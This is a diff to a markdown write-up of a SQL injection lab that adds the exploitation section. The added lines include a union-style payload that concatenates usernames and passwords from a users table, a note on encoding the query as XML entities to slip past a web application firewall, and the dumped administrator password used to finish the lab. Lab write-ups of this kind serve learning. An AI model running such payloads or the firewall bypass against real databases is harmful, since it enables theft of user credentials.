@@ -52,15 +52,30 @@ Application returned `0 units` for requests containing >1 columns indicating the
 
 ### Exploitation
 
+Concatenated username and password from username table 
+
+```SQL
+SELECT username || ':' || password FROM users
+```
+
+Encoded query into XML entity to bypass WAF
+
 ![Exploit-Encoded](SQLi_Images/SQLi_exploit-enc.jpeg)
+
+Observed response and dumped credentials 
 
 ![Dump-Creds](SQLi_Images/SQLi_got-creds.jpeg)
 
+- Collected Credentials 
 
+Username: administrator
+Password: jm920ccdtmbvmcctlngy
 
 
 
 ### Room Complete 
+
+Used adminstrators credentials to log in and solve the lab 
 
 [Flag-Capture](SQLi_Images/SQLi_solve.jpeg)
 
